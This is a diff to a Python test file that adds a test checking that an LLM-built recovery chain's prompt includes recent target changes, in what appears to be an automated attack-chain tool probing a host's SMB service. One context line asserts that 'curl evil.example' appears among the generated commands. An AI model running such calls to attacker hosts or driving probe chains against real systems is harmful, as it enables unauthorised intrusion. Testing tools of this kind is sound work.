@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import json
 from types import SimpleNamespace
 
 from modules.mediation import (
@@ -198,4 +199,45 @@ class TestChainMediatorLlmPort:
         commands = [step.run for step in chain.steps]
         assert "curl evil.example" in commands
         assert all("sudo" not in command for command in commands)
+
+    def test_recovery_prompt_carries_recent_changes(self, monkeypatch, tmp_path):
+        """Given world changes on the target, When recovery is built, Then the prompt carries them."""
+        import time
+
+        import modules.lazy_world_diff as lwd
+        from modules.chain_runner import ChainRunResult, StepOutcome
+
+        monkeypatch.setattr(lwd, "SESSIONS_DIR", tmp_path)
+        (tmp_path / "lazy_changes.jsonl").write_text(
+            json.dumps({"kind": "service_changed", "ip": "10.0.0.9", "port": 445,
+                        "before": {"service": "smb", "version": "1"},
+                        "after": {"service": "smb", "version": "2"},
+                        "detected": time.time()}) + "\n",
+            encoding="utf-8",
+        )
+
+        captured: dict = {}
+
+        class FakePort:
+            def complete(self, prompt, max_tokens=300, task_id=""):
+                captured["prompt"] = prompt
+                return "run another probe\n"
+
+            def has_members(self):
+                return True
+
+        result = ChainRunResult(
+            name="probe",
+            target="10.0.0.9",
+            run_id="r1",
+            steps=[StepOutcome(id="s1", run="true", status="error", output="", reason="down")],
+        )
+        self._patch_hub(monkeypatch, FakePort())
+        from cli import apt_chain_support as acs
+
+        chain = acs.build_llm_recovery_chain(result, target="10.0.0.9", task_id="t")
+        assert chain is not None
+        prompt = captured["prompt"]
+        assert "Recent world changes" in prompt
+        assert "service_changed" in prompt
         assert all(step.continue_on_error for step in chain.steps[:3])
